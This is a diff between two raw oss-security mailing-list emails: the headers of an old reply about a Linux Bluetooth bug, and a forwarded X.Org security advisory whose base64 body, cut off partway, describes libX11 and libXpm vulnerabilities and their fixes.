@@ -1,4 +1,4 @@
-Received: (qmail 1957 invoked by uid 550); 15 Dec 2022 20:56:09 -0000
+Received: (qmail 5560 invoked by uid 550); 3 Oct 2023 16:31:59 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,594 +7,486 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 22100 invoked from network); 15 Dec 2022 20:36:18 -0000
-Date: Thu, 15 Dec 2022 14:36:03 -0600
-From: John Helmert III <ajak@gentoo.org>
+Received: (qmail 5522 invoked from network); 3 Oct 2023 16:31:57 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=message-id : date :
+ subject : references : to : from : in-reply-to : content-type :
+ mime-version; s=corp-2023-03-30;
+ bh=wjymxz6z6qcPa0N/LKuUHEvCudEW1o/sc/9w9xLruKI=;
+ b=35oyTSZ00mCp9+fTtT5MZXolhOuNuauaiPEHAnjs6N0MaawM2BZRMnFvvhKp74XUC6Wt
+ QE08hK+v0DcV5C2q1URqywoVv+PofHMyAGtBq6qBldC3NbvKN1oV7KTwamZijscp5Mwt
+ 0cCnLgyqUeBP7uGhv8UCtwjDgkSaw0C8J59ebLHxC+4fKKuvtCDq09Xx6mxlKVLtGyGc
+ qMbURLm+nntYoY9Hvhsg+rkd1S72udmCZ86qq4NMHhVBM86YF4/0w/n+gmdol/eO9m/V
+ 0nfwN6GyvkSdRgzyt7wUudtwsk0geyDorKDmPFtTMFzatRg1jMgsq8lcQnF+Ra5DXX7l tw== 
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=JYxdP+iEqjUL0sXqtOverGimaBZ+irE2kV+Sv6ya9jhKRjJAD7gCjtOgLTFUSlJqcSwr5k8NDZV+2l7ijwAc9DefIYbaczt/pLZuGbwtRpHaaSlLurHxWBZy57K94dY2/nl02f+fNwglm4D5LLcebdQSE5P/nrMbUAwSLOcWf6uB/YQ30gbCMFybOakShR+Ped1Ttjs4+wwun/GHBTgSoMff0fMbLDGpaYRauhfH3+r5dOm9DkYdw1ieBefHDyK4j0mtrF5gxOXBuZzz03a/UGlpjWaBPXeb9lPCPj5OhxCHhsfrgcok56KtPs6tf0VGgZkKJ1oG4DKSI1VzUurkig==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=wjymxz6z6qcPa0N/LKuUHEvCudEW1o/sc/9w9xLruKI=;
+ b=AkuLd1gaG8ncmX1z4+IdqD+gsCTSNwIfdmVxwEPH9bAWXKEBz4WtqSoIMSfBvD3N4PUDOg4VkBbwMbKknLzCMuZ+quKCeWrRaUSMCT4Jq8H1guUeI0fKoIdPnwam4wyuPXkqgZekg16Iq+O6kWrjo2iA4z3X9KQiPnARLrSIigQsr5z+vEcaW2onCRcYdH5AqY/B/SGFYACZdA5QxV6dN1TwLhpowSxt4m9Z0r3UCAM+Cjb8RPYvtURjgfvJzsJIiDMjp1ELM++DIi8lC50cDry/paQsIn1L47Ol8Ldpxbr0aPlo4OqnL/QVBy11xeek4qhdvHdyl/l6USADc8Op5w==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
+ dkim=pass header.d=oracle.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=wjymxz6z6qcPa0N/LKuUHEvCudEW1o/sc/9w9xLruKI=;
+ b=fDndNFg9TLUDoz9K5kIear+e1Hjsmwb9eihAemOs2tNES6ngDEVH+cWo2HdN0ItcgAh5ZhLhXaH0LwaIKEhwCZkCTy5flvLjmaerNfN6aoSEN2MWML3F2gsx0F+7IeaeEzg6gmrVbpg0PtUGh2eHGEQU2TFe77W/vzkRK+ZIWY8=
+Message-ID: <e95ba96a-88e7-4bf1-a18b-12b566812225@oracle.com>
+Date: Tue, 3 Oct 2023 09:31:27 -0700
+User-Agent: Mozilla Thunderbird
+References: <ZRxA6isrnf2hA3QD@also.us.oracle.com>
+Content-Language: en-US
 To: oss-security@lists.openwall.com
-Cc: carnil@debian.org
-Message-ID: <Y5uFM+cfCRapuBqA@gentoo.org>
-References: <CAFXgH+PXHvA8ueX5P2yYHWeOOdkkPjQLHnG9c1gNd53Y1Ekm1Q@mail.gmail.com>
- <Y5o5/QBvu4SwouGl@eldamar.lan>
- <CAFXgH+MSuNdXS3sfeXB+KBPnPH9oNgN_tuk_6oRO0RSqQu3b3A@mail.gmail.com>
+From: Alan Coopersmith <alan.coopersmith@oracle.com>
+Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
+ xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
+ q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
+ RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
+ /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
+ PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
+ vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
+ GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
+ ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
+ ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
+ AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
+ DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
+ bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
+ yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
+ Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
+ XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
+ R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
+ EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
+ 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
+ 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
+ 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
+ LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
+ AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
+ uoPzepWFbgvLuHIMvyjRog==
+In-Reply-To: <ZRxA6isrnf2hA3QD@also.us.oracle.com>
+X-Forwarded-Message-Id: <ZRxA6isrnf2hA3QD@also.us.oracle.com>
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="------------McsT3od8vatL7WmkiOWDElPT"
+X-ClientProxiedBy: LO6P123CA0005.GBRP123.PROD.OUTLOOK.COM
+ (2603:10a6:600:338::10) To IA0PR10MB7303.namprd10.prod.outlook.com
+ (2603:10b6:208:40d::5)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="NkTcwObf9/6QfcH8"
-Content-Disposition: inline
-In-Reply-To: <CAFXgH+MSuNdXS3sfeXB+KBPnPH9oNgN_tuk_6oRO0RSqQu3b3A@mail.gmail.com>
-Subject: Re: [oss-security] Linux Kernel: UAF in Bluetooth L2CAP Handshake
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: IA0PR10MB7303:EE_|PH7PR10MB6180:EE_
+X-MS-Office365-Filtering-Correlation-Id: eb21e079-dca3-47d8-66e5-08dbc42e35a2
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam: BCL:0;
+X-Microsoft-Antispam-Message-Info: 
+	//uzLxnY7OGtBJgD+JMjzmAcXC9OnBwh1m00v80Oc38Y1AnvJej+2LbYWV0/4638rmHlICxiIyXWcnjkX6DQWzF9e2XENAOhbb2utVHKEFnZs+dRKaJ13GO30Ttrbz+asfGN7cYsPXRxYSzsNM9Vvq2+0EGvNOloDSjjxX54eOraVdnlu71FhevKBY/mqUTsEwoJbYETmhsvcaPSKhKUUdM2+Qw49eh2/ihzSli+ACwg2GMp4qFD4mkW/DU1aP7s0jQkrh+Cx9SvWrlWFKnCvpEFf2bO4iDI39kpa+oCfxNr+uo0NEeqARzmkRBMq9btM4CARkSVXtMtX2RhaJRgEFL2SUeVK79nOrL3jq6Szd+lajjuGKvN3u8wknJNTF0sAxr7WuueX7LNBGt9+Uuk/qiDtVVj9YNqZlz3KcpVc3FARVVz+6lssXWijNzkGyEyKpPVxd2jKAC7O4Rq2CiOFWQFbDmaoZVhuf8jKmKPaa1UIQnB0EeRIIxFz4SEsicbcSr1xjFDNdbUQ/1V2+rvHHkodNAb5VtLskJRc88jqpMgNHwSnX/uOXi+fmFniE8cjo3rl8OIXK30WLxscXhnbA1VZ/yS4n515Cr+cn4n0dCpPROroGFtHV2TVsYZA/xO3b0r//xOMLcz8J40EBqUi5sw3rVWTg2ppyIP8ex9Hvs=
+X-Forefront-Antispam-Report: 
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:IA0PR10MB7303.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230031)(376002)(366004)(136003)(39860400002)(396003)(346002)(230922051799003)(451199024)(64100799003)(186009)(1800799009)(44832011)(5660300002)(8936002)(8676002)(31696002)(15650500001)(86362001)(235185007)(2906002)(36756003)(966005)(478600001)(6512007)(31686004)(21480400003)(26005)(83380400001)(2616005)(33964004)(38100700002)(6666004)(6506007)(6486002)(316002)(6916009)(66946007)(41300700001)(66556008)(66476007)(43740500002)(45980500001);DIR:OUT;SFP:1101;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0: 
+	=?utf-8?B?ZE95VHpsVzk1VFFqQVlkWUJxYm9DWGNIOHh3K3o4ZG13eTdpY245dEFBR2tC?=
+ =?utf-8?B?WllJWElUcHgwNnZDZTd4VE8vWTdJM25MM2Y3SER6MHVyWVh0M0JiOVUyeXYw?=
+ =?utf-8?B?dDh4L2hBOVpKYUNCYldINytOMTNyN3orQVREWDd0NU9oTGxZdzcwamRBOVN4?=
+ =?utf-8?B?bnphc3FSSHFjWGd2dVpyMzhIYS9MdkpzUTM1eHpLYVJucnhVNmw5WjRCZnJq?=
+ =?utf-8?B?NjlISGtqUHRtbzY5Wi9vVHdEN1c2MnZTbG4yekJaNXZNNzZJdkxIWUxLaExJ?=
+ =?utf-8?B?ODByOEtOUTRqUVZpUWltdTBESytIbldWK2hnazBiMTRJRG1XbjZPTjB6dUFU?=
+ =?utf-8?B?MnZ1S2gzMDZKa1g0ZnYwb2ZiT1dWRHE4QXJ0K1hnenJTb0RScU9IRk5RM3Zp?=
+ =?utf-8?B?VGZxSE92RzE1MlBDczI0aWNmUmRva1BVWXBKamlOUFNseklkTzYvLzIwQ3pW?=
+ =?utf-8?B?Nmx6L1ptQVBTamdzVVgzQ3p2dW5YNS8zRG9wazNYSWFXem16WmVGMnByMndT?=
+ =?utf-8?B?WUIyT2NXM0d2TGhGY3h3QjIzR1NXc3VRSkxldFNDMlFBL1YrL3Y5NENrV2VN?=
+ =?utf-8?B?aTdhWFVtTGZ3eWJ0SjF1SFJzUE9weU80MVcyaTdnNWNOeUhCemV5endVNTQ0?=
+ =?utf-8?B?eFVJdzlybEZ1R3ByOUtsSE8vdXVUaHFrTmFEQW42R292LzVCUEZlWlp1NTM5?=
+ =?utf-8?B?b2N4bzZnbmYxK3VtWnA0N3NtSWV1VGRhalg5RjIrWjhHencvdmt6NEZESXM1?=
+ =?utf-8?B?b2VYcHdrZmMzVXRQcHo5Rm1kODVpV1VLVXA3Zld4cmJKd2RqL3E2eEdGRE94?=
+ =?utf-8?B?MkdhaU1hQWlKU2xaYXlkbVQzZjVBcmwvRFJxcC9HL0lsVVRRSFRIdjJhOHN3?=
+ =?utf-8?B?Qm90RTYvUGFyR3lMdFlaVDUvSUpjWkpDTkc0Z1V5cFdKZVR0cWZkVGZzZjI1?=
+ =?utf-8?B?aVIzWFpUSXVHd2FWV20xNCtnbENuV0lCT0t4dFhBSlJIdm9SbkpQMGFLMTBC?=
+ =?utf-8?B?UjN3YXpMa1ZuQTgxeEJtUTBaYk8yL3R2U28zK0pMMVhBTGgyS0tTWW53OTFN?=
+ =?utf-8?B?a3NkUkI0NnE4bk9wVUx3cHIrV0Y5enYwQ2VqNCt5Uzh0Z2lOOFpzQ2o3L2lJ?=
+ =?utf-8?B?VS92QzM3R0JoN2Y3VFFDMnRteUJad2lFaUxFSTA3bG5EMCtjeUdOWThsQWZa?=
+ =?utf-8?B?ZGt5cXRpQU1oYVlST0VNMUtwOWtjcHlLRk5PczQvV3BWdUVJVDJIMi9iMmc3?=
+ =?utf-8?B?RXAvdWlDbnV6cS9SS2NEZkdCbVBWM3ppb0RZTVVpQzNxYkprUUQrOWpaeVRy?=
+ =?utf-8?B?VllBZ3hXOTZyUExWR05FT0pzOVpuSkRZNXVVVjBGcm5ra3U4ZkVtZHBCN2pI?=
+ =?utf-8?B?dlNTeUFGSERFbGdHUWo0alNyUmRIWjE0OHBzWjhOZGpPSUNBUGh6anR6Z1dN?=
+ =?utf-8?B?N3lDRUhwOWhMYnhwMGxvVlE0MTlrZzFoaVdlU0ZZWFRzMFAwZno2cjU5WGEy?=
+ =?utf-8?B?MXVNNnJZV2NKOTBsYi9TbnlpRTluM05qQTJtYkFpckRycFYwL2ZHbXVRRUZ0?=
+ =?utf-8?B?UFRNM1ZIVkFwWVlIalF0MSsvYVoyek4ydmk0UWFqQmxmOWs3UlI2L0puSTNU?=
+ =?utf-8?B?ZTVNeGNQUFhzckhzRWE3U3BKbjhNaUJVVk9xdUQ3T2ZmTmtxV2xRL0J0SXhV?=
+ =?utf-8?B?K2dIcktWYXlIT2ZnaTdBbWp2NmxZdzF4NXN3eHp2ajFkUXAyTXN3MDkvczlz?=
+ =?utf-8?B?b3VsOEdWRVNBTkVYWkpvQVpsRHQ4Y2xLOFgvZ3Mydkc4bmFpaHNZMnNCem5T?=
+ =?utf-8?B?VzN6TkRuWlF1NjRrU21Uc1lZV21FL3QvaW1KRjhlNzJjWEZRa0tIQkNhRURl?=
+ =?utf-8?B?cllMVFBqeWVQY3FleFFuSmhJTUFaNnkybWJXYmcyN2NmU296blRiK1hwa1cw?=
+ =?utf-8?B?S2pjWm0zS2J6b3N0Sk1uOEpFay9DZ0JOLzRFUTQ0WFpjNzh2eFdWSWdiMDZz?=
+ =?utf-8?B?TGgrNVNObFVXTlBkbjZFa050VkZTOUpVRWFMdS9FcU11cnJobFpseUhodG1s?=
+ =?utf-8?B?Q2wzRlpGTk8vUVdSYVhTVkRUSnZISVZZUkJCcUxGeWdMSENsWUtjSzVoVFQv?=
+ =?utf-8?B?enZVTmVDLytxQmorazhEUUhNS3dzc0YvMVlKU3BqQU1UQndtN0tQeHg1ajlk?=
+ =?utf-8?B?WUE9PQ==?=
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0: 
+	23/DT/VA/2He6IckAL2jSNb0yN2f4lc/yXod6/z2a6sA9IFWdyarBnGe9NkeMkPSyZzW3g+9MW3lM+d6IU0pDI2Fun6X7IuCEU+nSvST2qbhsOC0ANjjqXshNm23o7wiI8cf0O2iBqmBq0mBM/ncL5dHFMn1ksoCmLr4wkgvHoVgpa7AJ29NEG5TmC5E2rJ3M2BDdWQ3SiKyqV2ypz8YfWbkHMIIdKfX7AlXV7zzrL6X7Bs+Pn/GU9Vw1ZU4EfGCGdM4As0b4AuEr4ojEuHm/1wNbAcKEJxe2bVIPwBpPKkyGyfWYkeLhRzKp7/tFBoxe8eMhYdI3bF9QFCG33n5LVfYI5/RYkvL5846ZjFyLV+Be8CDtRRrtQ6plIPaiSDrR0bGtqKY14ZzC07jJpht/sQCEjay74zgdxuGx1rjh4EXWVXO5iOOlXYO9u346UTNxmcA9IZRPeefKS/uASLER9nmTdsziCGEgs7Jcp6GGotLPLbERWjIqcY6e3r+ocfLJUq4YPk7JZKy6DWEWj+cfzmuI+429KWibIkstXSErrHzwq2Ol4zVDi9NU7hc0QSe0BzZNk7HvAsrsnm7mZmtF6YYyIyv+MTJk+MicHJBE9GLqEs0/Jj7y6jrBkp7Li1Jsix0kZhp9qkOtNxFJhsYYHq4PjHyrwoq2HXeK1HjVgosQK05hzLsOcHyb4meXzuZCJePXlowdCQW6g/xb6n9KQFD1ty7E5wvjcl2yYy+dyqaKVGFxmW4Ms08JNc/u+eGwHpHOWMwv1NRGZ+Cnj1kFw==
+X-OriginatorOrg: oracle.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: eb21e079-dca3-47d8-66e5-08dbc42e35a2
+X-MS-Exchange-CrossTenant-AuthSource: IA0PR10MB7303.namprd10.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 Oct 2023 16:31:35.2711
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: xcs/f1v9pxt5eAbr949IckXAn9RSceryejJvF9idHiC9qIActcbC2n8bi8GggV2KfN6vF76SswComgXOi76weeOqiZ/XXI1TuzVi4SXwrIE=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH7PR10MB6180
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.267,Aquarius:18.0.980,Hydra:6.0.619,FMLib:17.11.176.26
+ definitions=2023-10-03_13,2023-10-02_01,2023-05-22_02
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 adultscore=0 mlxlogscore=999 mlxscore=0
+ spamscore=0 malwarescore=0 suspectscore=0 phishscore=0 bulkscore=0
+ classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2309180000
+ definitions=main-2310030124
+X-Proofpoint-GUID: 6FF41UfrGFveDq_PWNRTotXczWbj4S02
+X-Proofpoint-ORIG-GUID: 6FF41UfrGFveDq_PWNRTotXczWbj4S02
+Subject: [oss-security] Fwd: X.Org Security Advisory: Issues in libX11 prior to 1.8.7 &
+ libXpm prior to 3.5.17
 
---NkTcwObf9/6QfcH8
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
+--------------McsT3od8vatL7WmkiOWDElPT
+Content-Type: multipart/mixed; boundary="------------QAlHIM650fddVDn4ZWe7sF0T";
+ protected-headers="v1"
+From: Alan Coopersmith <alan.coopersmith@oracle.com>
+To: oss-security@lists.openwall.com
+Message-ID: <e95ba96a-88e7-4bf1-a18b-12b566812225@oracle.com>
+Subject: Fwd: X.Org Security Advisory: Issues in libX11 prior to 1.8.7 &
+ libXpm prior to 3.5.17
+References: <ZRxA6isrnf2hA3QD@also.us.oracle.com>
+In-Reply-To: <ZRxA6isrnf2hA3QD@also.us.oracle.com>
+
+--------------QAlHIM650fddVDn4ZWe7sF0T
+Content-Type: multipart/mixed; boundary="------------gr73DlKmyuwxihGG9VObfbD0"
+
+--------------gr73DlKmyuwxihGG9VObfbD0
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: base64
+
+DQoNCg0KLS0tLS0tLS0gRm9yd2FyZGVkIE1lc3NhZ2UgLS0tLS0tLS0NClN1
+YmplY3Q6IFguT3JnIFNlY3VyaXR5IEFkdmlzb3J5OiBJc3N1ZXMgaW4gbGli
+WDExIHByaW9yIHRvIDEuOC43ICYgbGliWHBtIHByaW9yIHRvIDMuNS4xNw0K
+RGF0ZTogVHVlLCAzIE9jdCAyMDIzIDA5OjI3OjIyIC0wNzAwDQpGcm9tOiBB
+bGFuIENvb3BlcnNtaXRoIDxhbGFuLmNvb3BlcnNtaXRoQG9yYWNsZS5jb20+
+DQpUbzogeG9yZy1hbm5vdW5jZUBsaXN0cy54Lm9yZw0KQ0M6IHhvcmdAbGlz
+dHMueC5vcmcNCg0KWC5PcmcgU2VjdXJpdHkgQWR2aXNvcnk6ICBPY3RvYmVy
+IDMsIDIwMjMNCg0KSXNzdWVzIGluIGxpYlgxMSBwcmlvciB0byAxLjguNyAm
+IGxpYlhwbSBwcmlvciB0byAzLjUuMTcNCj09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCk11bHRp
+cGxlIGlzc3VlcyBoYXZlIGJlZW4gZm91bmQgaW4gdGhlIGxpYlgxMSAmIGxp
+YlhwbSBsaWJyYXJpZXMgcHVibGlzaGVkDQpieSBYLk9yZyBmb3Igd2hpY2gg
+d2UgYXJlIHJlbGVhc2luZyBzZWN1cml0eSBmaXhlcyBpbiBsaWJYMTEgMS44
+LjcgJg0KbGliWHBtIDMuNS4xNy4NCg0KVGhlIGZpcnN0IGlzc3VlIChDVkUt
+MjAyMy00Mzc4NSkgY2FuIGJlIHRyaWdnZXJlZCBieSBjb25uZWN0aW5nIHRv
+IGFuDQpYIHNlcnZlciB0aGF0IHNlbmRzIHNwZWNpYWxseSBjcmFmdGVkIHJl
+cGxpZXMgdG8gWDExIHByb3RvY29sIHJlcXVlc3RzLg0KDQpUaGUgb3RoZXIg
+NCBpc3N1ZXMgY2FuIGJlIHRyaWdnZXJlZCBieSBvcGVuaW5nIHNwZWNpYWxs
+eSBjcmFmdGVkIFhQTSBmb3JtYXQNCmltYWdlIGZpbGVzIHZpYSBsaWJYcG0u
+ICBUd28gb2YgdGhlIGZvdXIgaXNzdWVzIGhhdmUgcm9vdCBjYXVzZXMgaW4g
+dGhlDQpsaWJYMTEgbGlicmFyeSBhbmQgYXJlIGZpeGVkIHRoZXJlLCBidXQg
+cGF0Y2hlcyBoYXZlIGFsc28gYmVlbiBhcHBsaWVkDQp0byBsaWJYcG0gdG8g
+YXZvaWQgcGFzc2luZyB0aGUgaW52YWxpZCBkYXRhIHRvIGxpYlgxMSBpbiB0
+aGUgZmlyc3QgcGxhY2UuDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0NCg0KMSkgQ1ZFLTIwMjMtNDM3ODUgbGliWDExOiBvdXQtb2YtYm91
+bmRzIG1lbW9yeSBhY2Nlc3MgaW4gX1hrYlJlYWRLZXlTeW1zKCkNCg0KSW50
+cm9kdWNlZCBpbjogWDExUjYuMSBbcmVsZWFzZWQgTWFyY2ggMTk5Nl0NCkZp
+eGVkIGluOiBsaWJYMTEgMS44LjcNCkZvdW5kIGJ5OiBHcmVnb3J5IEphbWVz
+IERVQ0sNCkZpeGVkIGJ5OiBBbGFuIENvb3BlcnNtaXRoIG9mIE9yYWNsZSBT
+b2xhcmlzIEVuZ2luZWVyaW5nDQoNCldoZW4gbGliWDExIGlzIHByb2Nlc3Np
+bmcgdGhlIHJlcGx5IGZyb20gdGhlIFggc2VydmVyIHRvIHRoZSBYa2JHZXRN
+YXANCnJlcXVlc3QsIGlmIGl0IGRldGVjdGVkIHRoZSBudW1iZXIgb2Ygc3lt
+Ym9scyBpbiB0aGUgbmV3IG1hcCB3YXMgbGVzcw0KdGhhbiB0aGUgc2l6ZSBv
+ZiB0aGUgYnVmZmVyIGl0IGhhZCBhbGxvY2F0ZWQsIGl0IGFsd2F5cyBhZGRl
+ZCByb29tIGZvcg0KMTI4IG1vcmUgc3ltYm9scywgaW5zdGVhZCBvZiB0aGUg
+YWN0dWFsIHNpemUgbmVlZGVkLiBXaGlsZSB0aGUNCl9Ya2JSZWFkQnVmZmVy
+Q29weUtleVN5bXMoKSBoZWxwZXIgZnVuY3Rpb24gcmV0dXJuZWQgYW4gZXJy
+b3IgaWYgYXNrZWQNCnRvIGNvcHkgbW9yZSBrZXlzeW1zIGludG8gdGhlIGJ1
+ZmZlciB0aGFuIHRoZXJlIHdhcyBzcGFjZSBhbGxvY2F0ZWQgZm9yLA0KdGhl
+IGNhbGxlciBuZXZlciBjaGVja2VkIGZvciBhbiBlcnJvciBhbmQgYXNzdW1l
+ZCB0aGUgZnVsbCBzZXQgb2Yga2V5c3ltcw0Kd2FzIGNvcGllZCBpbnRvIHRo
+ZSBidWZmZXIgYW5kIGNvdWxkIHRoZW4gdHJ5IHRvIHJlYWQgb3V0IG9mIGJv
+dW5kcyB3aGVuDQphY2Nlc3NpbmcgdGhlIGJ1ZmZlci4gIGxpYlgxMSAxLjgu
+NyBoYXMgYmVlbiBwYXRjaGVkIHRvIGJvdGggZml4IHRoZSBzaXplDQphbGxv
+Y2F0ZWQgYW5kIGNoZWNrIGZvciBlcnJvciByZXR1cm5zIGZyb20gX1hrYlJl
+YWRCdWZmZXJDb3B5S2V5U3ltcygpLg0KDQpGaXg6DQpodHRwczovL2dpdGxh
+Yi5mcmVlZGVza3RvcC5vcmcveG9yZy9saWIvbGlieDExLy0vY29tbWl0LzY4
+NThkNDY4ZDljYTU1ZmI0YzVmZDcwYjIyM2RiYzc4YTMzNThhN2YNCg0KMikg
+Q1ZFLTIwMjMtNDM3ODYgbGliWDExOiBzdGFjayBleGhhdXN0aW9uIGZyb20g
+aW5maW5pdGUgcmVjdXJzaW9uDQogICAgaW4gUHV0U3ViSW1hZ2UoKQ0KDQpJ
+bnRyb2R1Y2VkIGluOiBYMTFSMiBbcmVsZWFzZWQgRmViLiAxOTg4XQ0KRml4
+ZWQgaW46IGxpYlgxMSAxLjguNw0KRm91bmQgYnk6IFlhaXIgTWl6cmFoaSBv
+ZiB0aGUgSkZyb2cgVnVsbmVyYWJpbGl0eSBSZXNlYXJjaCB0ZWFtDQpGaXhl
+ZCBieTogQWxhbiBDb29wZXJzbWl0aCBvZiBPcmFjbGUgU29sYXJpcyBFbmdp
+bmVlcmluZw0KDQpXaGVuIHNwbGl0dGluZyBhIHNpbmdsZSBsaW5lIG9mIHBp
+eGVscyBpbnRvIGNodW5rcyB0aGF0IGZpdCBpbiBhIHNpbmdsZQ0KcmVxdWVz
+dCAobm90IHVzaW5nIHRoZSBCSUctUkVRVUVTVFMgZXh0ZW5zaW9uKSB0byBz
+ZW5kIHRvIHRoZSBYIHNlcnZlciwNCnRoZSBjb2RlIGRpZCBub3QgdGFrZSBp
+bnRvIGFjY291bnQgdGhlIG51bWJlciBvZiBiaXRzIHBlciBwaXhlbCwgc28g
+d291bGQNCmp1c3QgbG9vcCBmb3JldmVyIGZpbmRpbmcgaXQgbmVlZGVkIHRv
+IHNlbmQgbW9yZSBwaXhlbHMgdGhhbiBmaXQgaW4gdGhlDQpnaXZlbiByZXF1
+ZXN0IHNpemUgYW5kIG5vdCBicmVha2luZyB0aGVtIGRvd24gaW50byBhIHNt
+YWxsIGVub3VnaCBjaHVuayB0bw0KZml0LiAgQW4gWFBNIGZpbGUgd2FzIHBy
+b3ZpZGVkIHRoYXQgdHJpZ2dlcmVkIHRoaXMgYnVnIHdoZW4gbG9hZGVkIHZp
+YQ0KbGliWHBtJ3MgWHBtUmVhZEZpbGVUb1BpeG1hcCgpIGZ1bmN0aW9uLCB3
+aGljaCBpbiB0dXJuIGNhbGxzIFhQdXRJbWFnZSgpDQphbmQgaGl0IHRoaXMg
+YnVnLg0KDQpGdXJ0aGVyIGhhcmRlbmluZyB0byBwcmV2ZW50IHNpbWlsYXIg
